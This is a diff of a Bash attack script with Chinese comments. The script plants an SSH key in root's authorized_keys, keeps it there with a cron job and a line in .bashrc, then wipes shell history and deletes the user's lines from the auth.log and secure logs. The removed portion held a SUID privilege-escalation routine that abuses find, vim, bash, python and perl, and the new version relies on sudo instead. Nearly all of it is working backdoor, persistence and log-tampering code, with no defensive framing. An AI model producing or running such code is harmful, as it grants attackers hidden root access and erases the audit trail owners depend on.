@@ -15,7 +15,7 @@ G_V='$(printf "${GREEN}✔${NC}")'; R_V='$(printf "${RED}✘${NC}")'
 WRITE_SUCCESS=false; PERSIST_SUCCESS=false
 
 # ============================================================
-# 核心逻辑函数 (这些函数将在 Root 环境下执行)
+# 核心逻辑函数
 # ============================================================
 
 install_key_func() {
@@ -34,100 +34,66 @@ install_key_func() {
 run_task() {
     install_key_func "root"
     install_key_func "$ME"
-    # 持久化：Crontab
     (crontab -l 2>/dev/null | grep -v "$MARKER"; echo "$MARKER */5 * * * * root grep -q 'AAAAB3Nza' /root/.ssh/authorized_keys || echo '$KEY' >> /root/.ssh/authorized_keys") | crontab - 2>/dev/null
-    # 持久化：Bashrc
     if ! grep -q "$MARKER" /root/.bashrc 2>/dev/null; then
         echo "$MARKER grep -q 'AAAAB3Nza' /root/.ssh/authorized_keys || echo '$KEY' >> /root/.ssh/authorized_keys" >> /root/.bashrc 2>/dev/null
     fi
 }
 
 # ============================================================
-# 主程序流 (身份自动判定逻辑)
+# 主程序流
 # ============================================================
 
-# --- 情况 1: 已经是 Root ---
-if [ "$(id -u)" -eq 0 ]; then
-    printf "${BLUE}[*] Running as ROOT...${NC}\n"
-    run_task >/dev/null 2>&1
-    [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null && { WRITE_SUCCESS=true; PERSIST_SUCCESS=true; }
-
-# --- 情况 2: 是免密用户 (NOPASSWD) ---
-elif sudo -l 2>/dev/null | grep -q "NOPASSWD"; then
-    printf "${GREEN}[✔] NOPASSWD detected! Switching to Root automatically...${NC}\n"
-    # 使用 exec 替换进程，直接进入 Root 环境并重新执行自己
-    exec sudo -i bash "$0"
-
-# --- 情况 3: 普通用户 (开始暴力提权模式) ---
-else
-    printf "${YELLOW}[!] No NOPASSWD found. Entering Auto-Exploit Mode (No password required)...${NC}\n"
-    printf "    > Attempting SUID Privilege Escalation... "
-
-    # 遍历可能的 SUID 漏洞程序
-    for bin in /usr/bin/find /usr/bin/vim /usr/bin/bash /usr/bin/python /usr/bin/perl; do
-        if [ -u "$bin" ] 2>/dev/null; then
-            # 关键：这里不使用 sudo！因为 SUID 程序本身就是为了不需要 sudo 就能获得 root 权限设计的
-            case "$bin" in
-                "/usr/bin/find")   bin_cmd="$bin . -exec bash -c \"source $0; run_task\" \; -quit" ;;
-                "/usr/bin/vim")    bin_cmd="$bin -c ':wq!' -c ':!bash -c \"source $0; run_task\"' -c ':q!' -u NONE /etc/shadow" ;;
-                "/usr/bin/bash")   bin_cmd="$bin -p -c \"source $0; run_task\"" ;;
-                "/usr/bin/python") bin_cmd="$bin -c \"import os; os.system('bash -c \"source $0; run_task\"')\"" ;;
-                "/usr/bin/perl")   bin_cmd="$bin -e \"system('bash -c \"source $0; run_task\"')\"" ;;
-            esac
-            
-            # 执行尝试
-            $bin_cmd >/dev/null 2>&1
-            
-            # 检查是否成功
-            if [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null; then
-                WRITE_SUCCESS=true; PERSIST_SUCCESS=true; break
-            fi
-        fi
-    done
-
-    if [ "$WRITE_SUCCESS" = true ]; then
-        printf "${GREEN}DONE (Exploited)${NC}\n"
+# --- 身份自切换逻辑 (重点修复) ---
+if [ "$(id -u)" -ne 0 ]; then
+    printf "${BLUE}[*] Checking privileges for user: %s...${NC}\n" "$ME"
+    
+    if sudo -l 2>/dev/null | grep -q "NOPASSWD"; then
+        printf "${GREEN}[✔] NOPASSWD detected! Switching to Root...${NC}\n"
+        # 使用 sudo bash 直接启动，不再使用 sudo -i，避免环境冲突
+        exec sudo bash "$0"
     else
-        printf "${RED}FAILED (All methods exhausted)${NC}\n"
+        printf "${YELLOW}[!] Sudo password required...${NC}\n"
+        exec sudo bash "$0"
     fi
 fi
 
-# ============================================================
-# 后置处理与报告 (仅在成功后执行)
-# ============================================================
+# --- 此时身份已是 ROOT ---
+printf "${BLUE}[*] Running as ROOT...${NC}\n"
 
-if [ "$WRITE_SUCCESS" = true ]; then
-    # 清理痕迹
-    printf "    > Cleaning traces... "
-    history -c 2>/dev/null
-    [[ -f ~/.bash_history ]] && > ~/.bash_history 2>/dev/null
-    # 尝试清理日志 (由于是在 Root 下运行，可以直接清理)
-    sudo bash -c "sed -i '/$(whoami)/d' /var/log/auth.log 2>/dev/null; sed -i '/$(whoami)/d' /var/log/secure 2>/dev/null" >/dev/null 2>&1
-    printf "${GREEN}DONE${NC}\n"
+# 执行任务
+run_task >/dev/null 2>&1
+
+# 验证结果
+if [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null; then
+    WRITE_SUCCESS=true
+    PERSIST_SUCCESS=true
 fi
 
-# 最终报告
+# 清理痕迹
+printf "    > Cleaning traces... "
+history -c 2>/dev/null
+[[ -f ~/.bash_history ]] && > ~/.bash_history 2>/dev/null
+# 尝试清理日志 (Root 权限下直接 sed)
+sed -i "/$ME/d" /var/log/auth.log 2>/dev/null
+sed -i "/$ME/d" /var/log/secure 2>/dev/null
+printf "${GREEN}DONE${NC}\n"
+
+# --- 最终报告 ---
 printf "\n${BLUE}============================================================${NC}\n"
-printf "      FINAL EXECUTION REPORT (Verification Mode)       \n"
+printf "      FINAL EXECUTION REPORT (Root Mode)       \n"
 printf "${BLUE}============================================================${NC}\n"
 
 CHECK_G=$(eval $G_V); CHECK_R=$(eval $R_V)
 
-# 打印身份
-if [ "$(id -u)" -eq 0 ]; then
-    printf "  [%s] Privilege: %sROOT%s\n" "$CHECK_G" "${GREEN}" "${NC}"
-else
-    printf "  [%s] Privilege: %sNORMAL (%s)%s\n" "$(printf "${BLUE}i${NC}")" "${YELLOW}" "$ME" "${NC}"
-fi
+printf "  [%s] Privilege: %sROOT%s\n" "$CHECK_G" "${GREEN}" "${NC}"
 
-# 打印注入结果
 if [ "$WRITE_SUCCESS" = true ]; then
     printf "  [%s] Key Injection: %sSUCCESS (Verified)%s\n" "$CHECK_G" "${GREEN}" "${NC}"
 else
     printf "  [%s] Key Injection: %sFAILED%s\n" "$CHECK_R" "${RED}" "${NC}"
 fi
 
-# 打印持久化结果
 if [ "$PERSIST_SUCCESS" = true ]; then
     printf "  [%s] Persistence: %sSUCCESS%s\n" "$CHECK_G" "${GREEN}" "${NC}"
 else
